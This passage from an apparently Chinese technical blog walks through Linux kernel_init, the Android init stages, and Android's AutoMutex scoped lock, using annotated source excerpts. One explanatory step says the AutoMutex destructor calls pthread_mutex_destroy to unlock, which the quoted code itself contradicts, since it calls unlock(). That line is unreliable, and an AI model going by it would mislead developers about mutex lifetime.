kthreadd（内核线程管理进程）完成初始化，确保在内核线程管理机制准备好之前不会继续执行。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t这是启动用户空间进程的前提条件，因为用户态的进程可能需要创建内核线程，而 kthreadd 管理所有内核线程的创建。</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\twait_for_completion(&amp;kthreadd_done);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t•\tkernel_init_freeable 负责完成一些可以在内核空间中释放的初始化任务。这些任务包括加载设备驱动程序、设置文件系统等。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t此时系统仍处于内核态，确保内核态初始化完整后再释放内存。</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tkernel_init_freeable();</span><br><span class=\"line\">\t<span class=\"comment\">/* need to finish all async __init code before freeing the memory </span></span><br><span class=\"line\"><span class=\"comment\">\t•\tasync_synchronize_full() 确保所有的异步初始化操作都已完成。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t设置 system_state 为 SYSTEM_FREEING_INITMEM，表明系统已经准备好释放初始化用的内存。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t调用一系列函数（如 kprobe_free_init_mem、ftrace_free_init_mem 等）释放内核初始化过程中分配的内存。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\tfree_initmem() 释放 .init 段的内存，这部分内存仅用于启动时的内核态初始化，初始化完成后便不再需要，因此可以释放。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\tmark_readonly() 将某些内核代码段设置为只读，以增强系统的安全性</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tasync_synchronize_full();</span><br><span class=\"line\"></span><br><span class=\"line\">\tsystem_state = SYSTEM_FREEING_INITMEM;</span><br><span class=\"line\">\tkprobe_free_init_mem();</span><br><span class=\"line\">\tftrace_free_init_mem();</span><br><span class=\"line\">\tkgdb_free_init_mem();</span><br><span class=\"line\">\texit_boot_config();</span><br><span class=\"line\">\tfree_initmem();</span><br><span class=\"line\">\tmark_readonly();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * Kernel mappings are now finalized - update the userspace page-table</span></span><br><span class=\"line\"><span class=\"comment\">\t * to finalize PTI.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\tpti_finalize();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t将系统状态设置为 SYSTEM_RUNNING，表示系统已经完成内核态的初始化，可以正常运行。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t设置默认的 NUMA（非一致性内存访问）策略。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t调用 rcu_end_inkernel_boot() 结束 RCU 的启动状态，进入正常的 RCU 调度状态。</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tsystem_state = SYSTEM_RUNNING;</span><br><span class=\"line\">\tnuma_default_policy();</span><br><span class=\"line\"></span><br><span class=\"line\">\trcu_end_inkernel_boot();</span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t•\tdo_sysctl_args() 解析启动时传入的系统控制参数（sysctl arguments），并应用这些参数。</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tdo_sysctl_args();</span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t内核接下来会尝试启动 init 进程，进入用户空间，并完成从内核态到用户态的过渡。它会按顺序检查不同的命令，直到成功启动一个 init 程序。</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ramdisk_execute_command) &#123;</span><br><span class=\"line\">\t\tret = run_init_process(ramdisk_execute_command);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!ret)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tpr_err(<span class=\"string\">&quot;Failed to execute %s (error %d)\\n&quot;</span>,</span><br><span class=\"line\">\t\t       ramdisk_execute_command, ret);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * We try each of these until one succeeds.</span></span><br><span class=\"line\"><span class=\"comment\">\t *</span></span><br><span class=\"line\"><span class=\"comment\">\t * The Bourne shell can be used instead of init if we are</span></span><br><span class=\"line\"><span class=\"comment\">\t * trying to recover a really broken machine.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (execute_command) &#123;</span><br><span class=\"line\">\t\tret = run_init_process(execute_command);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!ret)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tpanic(<span class=\"string\">&quot;Requested init %s failed (error %d).&quot;</span>,</span><br><span class=\"line\">\t\t      execute_command, ret);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (CONFIG_DEFAULT_INIT[<span class=\"number\">0</span>] != <span class=\"string\">&#x27;\\0&#x27;</span>) &#123;</span><br><span class=\"line\">\t\tret = run_init_process(CONFIG_DEFAULT_INIT);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">\t\t\tpr_err(<span class=\"string\">&quot;Default init %s failed (error %d)\\n&quot;</span>,</span><br><span class=\"line\">\t\t\t       CONFIG_DEFAULT_INIT, ret);</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!try_to_run_init_process(<span class=\"string\">&quot;/sbin/init&quot;</span>) ||</span><br><span class=\"line\">\t    !try_to_run_init_process(<span class=\"string\">&quot;/etc/init&quot;</span>) ||</span><br><span class=\"line\">\t    !try_to_run_init_process(<span class=\"string\">&quot;/bin/init&quot;</span>) ||</span><br><span class=\"line\">\t    !try_to_run_init_process(<span class=\"string\">&quot;/bin/sh&quot;</span>))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpanic(<span class=\"string\">&quot;No working init found.  Try passing init= option to kernel. &quot;</span></span><br><span class=\"line\">\t      <span class=\"string\">&quot;See Linux Documentation/admin-guide/init.rst for guidance.&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">内核态到用户态的过渡</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"number\">1.</span>\t启动 init 进程：内核首先在内核态完成各项初始化工作，创建并执行 init 进程。</span><br><span class=\"line\">\t<span class=\"number\">2.</span>\t执行用户空间的 init 程序：init 程序成功启动后，系统将从内核态过渡到用户态。此时，init 成为用户空间中第一个进程，接管系统控制权。</span><br><span class=\"line\">\t<span class=\"number\">3.</span>\t进入用户空间：执行 execve（或类似的系统调用）将用户空间的 init 程序加载到内存中，内核清除旧的内存映射并建立用户空间的内存映射，完成从内核态到用户态的过渡。</span><br><span class=\"line\">\t<span class=\"number\">4.</span>\t系统进入正常运行：一旦 init 进程运行，系统便进入多用户模式，可以运行用户应用程序和守护进程。</span><br><span class=\"line\"></span><br><span class=\"line\">kernel_init:</span><br><span class=\"line\">\t•\tkernel_init 函数完成内核态的初始化任务并最终启动 init 进程。</span><br><span class=\"line\">\t•\t内核通过逐步释放内存、更新系统状态等操作，为进入用户态做好准备。</span><br><span class=\"line\">\t•\t当 init 程序启动成功，系统完成从内核态到用户态的过渡，内核初始化阶段结束，用户空间的系统管理程序正式接管控制权。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"init\"><a href=\"#init\" class=\"headerlink\" title=\"init\"></a>init</h2>源码：<code>system/core/init/main.cpp</code><br>进程位置：<code>/system/core/init</code></li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> __has_feature(address_sanitizer)</span></span><br><span class=\"line\">    __asan_set_error_report_callback(AsanReportCallback);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">strcmp</span>(<span class=\"built_in\">basename</span>(argv[<span class=\"number\">0</span>]), <span class=\"string\">&quot;ueventd&quot;</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">ueventd_main</span>(argc, argv);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">strcmp</span>(argv[<span class=\"number\">1</span>], <span class=\"string\">&quot;subcontext&quot;</span>)) &#123;</span><br><span class=\"line\">            android::base::<span class=\"built_in\">InitLogging</span>(argv, &amp;android::base::KernelLogger);</span><br><span class=\"line\">            <span class=\"type\">const</span> BuiltinFunctionMap function_map;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">SubcontextMain</span>(argc, argv, &amp;function_map);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">strcmp</span>(argv[<span class=\"number\">1</span>], <span class=\"string\">&quot;selinux_setup&quot;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">SetupSelinux</span>(argv);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">strcmp</span>(argv[<span class=\"number\">1</span>], <span class=\"string\">&quot;second_stage&quot;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">SecondStageMain</span>(argc, argv);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">FirstStageMain</span>(argc, argv);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>FirstStageMain</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">FirstStageMain</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\">\tstd::vector&lt;std::pair&lt;std::string, <span class=\"type\">int</span>&gt;&gt; errors;</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"keyword\">define</span> CHECKCALL(x) \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"keyword\">if</span> (x != 0) errors.emplace_back(#x <span class=\"string\">&quot; failed&quot;</span>, errno);</span></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t#x：# 是预处理操作符，将参数 x 转换为字符串字面量。例如，如果 x 是 open(&quot;/some/file&quot;)，那么 #x 会被替换为字符串 &quot;open(\\&quot;/some/file\\&quot;)&quot;。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t#x &quot; failed&quot;：会生成类似 &quot;open(\\&quot;/some/file\\&quot;) failed&quot; 的字符串，表示 x 的调用失败。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\terrno：一个全局变量，通常用来存储最近一次系统调用或库函数的错误代码。errno 的值在发生错误时会被相应函数设置成错误代码，以便诊断错误原因。</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">    <span class=\"built_in\">CHECKCALL</span>(<span class=\"built_in\">clearenv</span>());</span><br><span class=\"line\">    <span class=\"built_in\">CHECKCALL</span>(<span class=\"built_in\">setenv</span>(<span class=\"string\">&quot;PATH&quot;</span>, _PATH_DEFPATH, <span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"type\">char</span>* path = <span class=\"string\">&quot;/system/bin/init&quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"type\">char</span>* args[] = &#123;path, <span class=\"string\">&quot;selinux_setup&quot;</span>, <span class=\"literal\">nullptr</span>&#125;;</span><br><span class=\"line\">    <span class=\"built_in\">execv</span>(path, <span class=\"built_in\">const_cast</span>&lt;<span class=\"type\">char</span>**&gt;(args));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>执行<code>/system/bin/init selinux_setup</code><br>SetupSelinux</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">SetupSelinux</span><span class=\"params\">(<span class=\"type\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">InitKernelLogging</span>(argv);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (REBOOT_BOOTLOADER_ON_PANIC) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">InstallRebootSignalHandlers</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Set up SELinux, loading the SELinux policy.</span></span><br><span class=\"line\">    <span class=\"built_in\">SelinuxSetupKernelLogging</span>();</span><br><span class=\"line\">    <span class=\"built_in\">SelinuxInitialize</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// We&#x27;re in the kernel domain and want to transition to the init domain.  File systems that</span></span><br><span class=\"line\">    <span class=\"comment\">// store SELabels in their xattrs, such as ext4 do not need an explicit restorecon here,</span></span><br><span class=\"line\">    <span class=\"comment\">// but other file systems do.  In particular, this is needed for ramdisks such as the</span></span><br><span class=\"line\">    <span class=\"comment\">// recovery image for A/B devices.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">selinux_android_restorecon</span>(<span class=\"string\">&quot;/system/bin/init&quot;</span>, <span class=\"number\">0</span>) == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">PLOG</span>(FATAL) &lt;&lt; <span class=\"string\">&quot;restorecon failed of /system/bin/init failed&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"type\">char</span>* path = <span class=\"string\">&quot;/system/bin/init&quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"type\">char</span>* args[] = &#123;path, <span class=\"string\">&quot;second_stage&quot;</span>, <span class=\"literal\">nullptr</span>&#125;;</span><br><span class=\"line\">    <span class=\"built_in\">execv</span>(path, <span class=\"built_in\">const_cast</span>&lt;<span class=\"type\">char</span>**&gt;(args));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// execv() only returns if an error happened, in which case we</span></span><br><span class=\"line\">    <span class=\"comment\">// panic and never return from this function.</span></span><br><span class=\"line\">    <span class=\"built_in\">PLOG</span>(FATAL) &lt;&lt; <span class=\"string\">&quot;execv(\\&quot;&quot;</span> &lt;&lt; path &lt;&lt; <span class=\"string\">&quot;\\&quot;) failed&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>执行<code>/system/bin/init second_stage</code><br>SecondStageMain</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">SecondStageMain</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    Epoll epoll;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">auto</span> result = epoll.<span class=\"built_in\">Open</span>(); !result) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">PLOG</span>(FATAL) &lt;&lt; result.<span class=\"built_in\">error</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t<span class=\"built_in\">InstallSignalFdHandler</span>(&amp;epoll);</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tActionManager&amp; am = ActionManager::<span class=\"built_in\">GetInstance</span>();</span><br><span class=\"line\">    ServiceList&amp; sm = ServiceList::<span class=\"built_in\">GetInstance</span>();</span><br><span class=\"line\">\t<span class=\"comment\">//加载启动脚本</span></span><br><span class=\"line\">    <span class=\"built_in\">LoadBootScripts</span>(am, sm);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h3><p>init进程是Linux系统中用户空间的第一个进程，进程号固定为1。Kernel启动后，在用户空间启动init进程，并调用init中的main()方法执行init进程的职责。对于init进程的功能为：</p>\n<ul>\n<li>挂载(mount) /sys, /dev 或者/proc等文件</li>\n<li>解析并运行所有的init.rc相关文件</li>\n<li>根据rc文件，生成相应的设备驱动节点</li>\n<li>处理子进程的终止(signal方式)</li>\n<li>提供属性服务的功能</li>\n</ul>\n<h3 id=\"解析启动脚本\"><a href=\"#解析启动脚本\" class=\"headerlink\" title=\"解析启动脚本\"></a>解析启动脚本</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">LoadBootScripts</span><span class=\"params\">(ActionManager&amp; action_manager, ServiceList&amp; service_list)</span> &#123;</span><br><span class=\"line\">    Parser parser = CreateParser(action_manager, service_list);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> bootscript = GetProperty(<span class=\"string\">&quot;ro.boot.init_rc&quot;</span>, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (bootscript.empty()) &#123;</span><br><span class=\"line\">        parser.ParseConfig(<span class=\"string\">&quot;/init.rc&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!parser.ParseConfig(<span class=\"string\">&quot;/system/etc/init&quot;</span>)) &#123;</span><br><span class=\"line\">            late_import_paths.emplace_back(<span class=\"string\">&quot;/system/etc/init&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!parser.ParseConfig(<span class=\"string\">&quot;/product/etc/init&quot;</span>)) &#123;</span><br><span class=\"line\">            late_import_paths.emplace_back(<span class=\"string\">&quot;/product/etc/init&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!parser.ParseConfig(<span class=\"string\">&quot;/product_services/etc/init&quot;</span>)) &#123;</span><br><span class=\"line\">            late_import_paths.emplace_back(<span class=\"string\">&quot;/product_services/etc/init&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!parser.ParseConfig(<span class=\"string\">&quot;/odm/etc/init&quot;</span>)) &#123;</span><br><span class=\"line\">            late_import_paths.emplace_back(<span class=\"string\">&quot;/odm/etc/init&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!parser.ParseConfig(<span class=\"string\">&quot;/vendor/etc/init&quot;</span>)) &#123;</span><br><span class=\"line\">            late_import_paths.emplace_back(<span class=\"string\">&quot;/vendor/etc/init&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        parser.ParseConfig(bootscript);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n<h3 id=\"启动解析的服务\"><a href=\"#启动解析的服务\" class=\"headerlink\" title=\"启动解析的服务\"></a>启动解析的服务</h3><h3 id=\"守护解析的服务\"><a href=\"#守护解析的服务\" class=\"headerlink\" title=\"守护解析的服务\"></a>守护解析的服务</h3><h3 id=\"启动java虚拟机\"><a href=\"#启动java虚拟机\" class=\"headerlink\" title=\"启动java虚拟机\"></a>启动java虚拟机</h3><h3 id=\"预加载资源\"><a href=\"#预加载资源\" class=\"headerlink\" title=\"预加载资源\"></a>预加载资源</h3><h3 id=\"循环等待孵化进程\"><a href=\"#循环等待孵化进程\" class=\"headerlink\" title=\"循环等待孵化进程\"></a>循环等待孵化进程</h3><h3 id=\"启动SystemServer-进程\"><a href=\"#启动SystemServer-进程\" class=\"headerlink\" title=\"启动SystemServer 进程\"></a>启动SystemServer 进程</h3><h3 id=\"创建SystemServer\"><a href=\"#创建SystemServer\" class=\"headerlink\" title=\"创建SystemServer\"></a>创建SystemServer</h3><h3 id=\"管理SystemServer\"><a href=\"#管理SystemServer\" class=\"headerlink\" title=\"管理SystemServer\"></a>管理SystemServer</h3>"},{"_content":"title: android 锁\nauthor: nuoen\ntags: []\ncategories:\n  - cpp \n  - android\n  - framework\ndate: 2025-03-29 21:39:00\n\n## AutoMutex\n场景：\n```cpp\nextern Mutex gDefaultServiceManagerLock;\n\nsp<IServiceManager> defaultServiceManager()\n{\n    if (gDefaultServiceManager != nullptr) return gDefaultServiceManager;\n\n    {\n        AutoMutex _l(gDefaultServiceManagerLock);\n        while (gDefaultServiceManager == nullptr) {\n            gDefaultServiceManager = interface_cast<IServiceManager>(\n                ProcessState::self()->getContextObject(nullptr));\n            if (gDefaultServiceManager == nullptr)\n                sleep(1);\n        }\n    }\n\n    return gDefaultServiceManager;\n}\n```\n图示：\n```\n          Multiple Threads Call defaultServiceManager()\n                         ↓\n         ┌──────────────────────────────────────┐\n         │ if (gDefaultServiceManager != nullptr)│  ← 已初始化就直接返回\n         └───────────────┬──────────────────────┘\n                         │\n                         ▼\n         ┌──────────────────────────────────────┐\n         │ AutoMutex _l(gDefaultServiceManagerLock); │ ← 所有线程都要在此排队加锁\n         └───────────────┬──────────────────────┘\n                         │\n        ┌────────────────┴────────────────────────────┐\n        │                                             │\n┌───────▼───────┐                          ┌──────────▼─────────┐\n│Thread A 先获得锁│                          │Thread B、C 等待锁 │\n└───────┬───────┘                          └────────────────────┘\n        │\n        │ gDefaultServiceManager == nullptr? 是\n        ▼\n┌──────────────────────────────────────────────┐\n│Thread A 尝试创建 ServiceManager 实例          │\n│gDefaultServiceManager = interface_cast(...)  │\n└──────────────────────────────────────────────┘\n        │\n        ▼\n┌──────────────────────────────────────────────┐\n│ 初始化成功，释放锁 AutoMutex 析构自动 unlock │\n└──────────────────────────────────────────────┘\n        │\n        ▼\n┌──────────────────────────────────────────────┐\n│ Thread B/C 被唤醒，加锁后检查变量不为 null   │\n│ if (gDefaultServiceManager != nullptr) return│\n└──────────────────────────────────────────────┘\n```\n•\t这是典型的线程安全 单例懒加载（lazy initialization）；\n•\t用锁保护了“只初始化一次”的语义；\n•\t整体非常适合用于系统服务的获取场景，如 IServiceManager。\n\n实现原理\nsystem/core/include/utils/Mutex.h\n```cpp\ntypedef Mutex::Autolock AutoMutex;\n\n    class SCOPED_CAPABILITY Autolock {\n      public:\n        inline explicit Autolock(Mutex& mutex) ACQUIRE(mutex) : mLock(mutex) { mLock.lock(); }\n        inline explicit Autolock(Mutex* mutex) ACQUIRE(mutex) : mLock(*mutex) { mLock.lock(); }\n        inline ~Autolock() RELEASE() { mLock.unlock(); }\n\n      private:\n        Mutex& mLock;\n        // Cannot be copied or moved - declarations only\n        Autolock(const Autolock&);\n        Autolock& operator=(const Autolock&);\n    };\n\nclass CAPABILITY(\"mutex\") Mutex {\n  public:\n    enum {\n        PRIVATE = 0,\n        SHARED = 1\n    };\n\n    Mutex();\n    explicit Mutex(const char* name);\n    explicit Mutex(int type, const char* name = nullptr);\n    ~Mutex();\n\n    // lock or unlock the mutex\n    status_t lock() ACQUIRE();\n    void unlock() RELEASE();\n\n        pthread_mutex_t mMutex;\n\n}\n\ninline status_t Mutex::lock() {\n    return -pthread_mutex_lock(&mMutex);\n}\n\ninline Mutex::~Mutex() {\n    pthread_mutex_destroy(&mMutex);\n}\n```\n调用逻辑就是：\n1. 声明一个 AutoMutex 变量，也就是Autolock -> Mutex& mLock;\n2. Mutex& mLock 变量，mLock->pthread_mutex_t \n3. AutoMutex _l(gDefaultServiceManagerLock); 构造时，调用pthread_mutex_lock 加锁；\n4. 变量 _l,在作用域结束后，会调用其析构函数,从而调用pthread_mutex_destroy ，从而自动解锁；\n附录：\n## 作用域\n\n✅ 什么是作用域？\n\t•\t在 C++ 中，作用域是 { ... } 大括号包围的代码块。\n\t•\t变量（比如 AutoMutex _l）的生命周期限定在这个代码块内。\n\t•\t一旦出了这个作用域，变量会被自动析构（即释放资源）。\n\n⸻\n\n🎯 AutoMutex 的作用域在哪？\n```cpp\n{\n    AutoMutex _l(gDefaultServiceManagerLock);\n    ...\n}\n```\n\t•\t开始：AutoMutex _l(...) 这一行\n\t•\t结束：紧接着的 } 结束大括号\n\t•\t这个作用域内加锁，退出作用域时自动解锁\n\n⸻\n\n🔄 生命周期过程图解\n\ndefaultServiceManager()\n┌────────────────────────────────────────────┐\n│ if (gDefaultServiceManager != nullptr) ...│ ← 